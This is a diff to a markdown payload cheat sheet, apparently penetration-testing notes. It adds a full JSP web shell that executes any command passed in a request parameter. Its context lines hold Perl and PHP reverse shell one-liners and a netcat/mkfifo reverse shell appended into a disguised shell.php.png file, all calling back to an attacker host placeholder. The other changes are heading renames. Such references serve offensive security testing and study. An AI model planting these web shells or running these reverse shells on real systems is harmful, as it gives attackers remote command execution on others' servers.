@@ -21,6 +21,7 @@
 - [HoaxShell](#hoaxshell)
 - [iconv](#iconf)
 - [JAVA Reverse Shell](#java-reverse-shell)
+- [JAVA Web Shell](#java-web-shell)
 - [JavaScript Keylogger](#javascript-keylogger)
 - [JDWP](#jdwp)
 - [lnk2pwn](#lnk2pwn)
@@ -32,7 +33,7 @@
 - [msfvenom](#msfvenom)
 - [Netcat Reverse Shell](#netcat-reverse-shell)
 - [Nishang](#nishang)
-- [Non-alphanumeric Webshell](#non-alphanumeric-webshell)
+- [Non-alphanumeric Web Shell](#non-alphanumeric-web-shell)
 - [ntlm_theft](#ntml_theft)
 - [PDF](#pdf)
 - [Perl Reverse Shell](#perl-reverse-shell)
@@ -422,6 +423,39 @@ public void onEnable() {
 }
 ```
 
+## JAVA Web Shell
+
+### shell.jsp
+
+```java
+<%@ page import="java.io.*, java.util.*, java.net.*" %>
+<%
+    String action = request.getParameter("action");
+    String output = "";
+
+    try {
+        if ("cmd".equals(action)) {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                Process p = Runtime.getRuntime().exec(cmd);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output += line + "\\n";
+                }
+                reader.close();
+            }
+        } else {
+            output = "Unknown action.";
+        }
+    } catch (Exception e) {
+        output = "Error: " + e.getMessage();
+    }
+    response.setContentType("text/plain");
+    out.print(output);
+%>
+```
+
 ## JavaScript Keylogger
 
 ### logger.js
@@ -755,7 +789,7 @@ $ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
 perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## PHP popen Web Shell
+## PHP popen Webshell
 
 > https://www.php.net/manual/en/function.popen.php
 
@@ -802,7 +836,7 @@ $ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 $ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' >> shell.php.png
 ```
 
-## PHP Web Shell
+## PHP Webshell
 
 ### Common Payloads
 
@@ -820,7 +854,7 @@ $ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <L
 <?php echo "test";?>
 ```
 
-### Alternative Web Shells
+### Alternative Webshells
 
 ```c
 <?=$_GET[0]?>
